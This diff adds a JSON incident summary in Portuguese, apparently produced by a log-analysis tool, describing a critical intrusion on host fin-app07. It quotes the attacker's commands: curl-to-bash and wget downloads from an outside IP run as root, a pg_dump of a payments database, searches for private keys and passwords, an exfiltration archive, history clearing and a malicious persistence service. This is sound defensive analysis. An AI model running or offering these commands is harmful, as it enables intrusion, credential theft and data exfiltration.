@@ -1,0 +1,25 @@
+{
+  "resumo_comportamental": "No host fin-app07, após o início da sessão do usuário amoura, o trecho mostra download e execução remota de payloads via 'bash -c \"curl -s http://198.51.100.23/loader.sh | bash\"' e via python3 com 'wget http://198.51.100.23/agent -O /tmp/.agent && chmod +x /tmp/.agent && /tmp/.agent', com o kernel registrando 'exe: executed /tmp/.agent (uid=0)' e um evento de auditoria type=EXECVE confirmando a execução, seguido por persistência com '/tmp/.agent --daemonize --config /tmp/.agent.cfg'. Em seguida ocorre coleta e exfiltração de dados do banco de pagamentos: 'python3 /tmp/.cache/collector.py --target /var/lib/postgresql/nimbus_payments', um EXECVE executando subprocess.run(['pg_dump','nimbus_payments']), carregamento de um segundo estágio com exec(open('/tmp/.cache/stage2.py').read()), busca por chaves/certificados com \"find / -name '*.pem' -o -name '*.key'\", compactação em '/tmp/.cache/exfil_bundle.tar.gz' e busca por credenciais com 'grep -R \"password\" /etc/nimbus-payments/'. O atacante então limpa rastros com 'history -c' e estabelece persistência adicional criando e habilitando o serviço malicioso nimbus-syncd.service (enable nimbus-syncd.service issued by dbsync), antes de um login SSH legítimo subsequente do usuário amoura a partir de 10.20.30.12.",
+  "entidades_identificadas": [
+    "fin-app07",
+    "amoura",
+    "tty2",
+    "198.51.100.23",
+    "/tmp/.agent",
+    "/tmp/.agent.cfg",
+    "python3",
+    "/tmp/.cache/collector.py",
+    "/var/lib/postgresql/nimbus_payments",
+    "pg_dump",
+    "/tmp/.cache/stage2.py",
+    "/var/lib/postgresql/nimbus_payments/backups",
+    "/tmp/.cache/exfil_bundle.tar.gz",
+    "/etc/nimbus-payments/",
+    "nimbus-syncd.service",
+    "dbsync",
+    "sshd",
+    "10.20.30.12",
+    "uid=0"
+  ],
+  "severidade_maxima": "critical"
+}
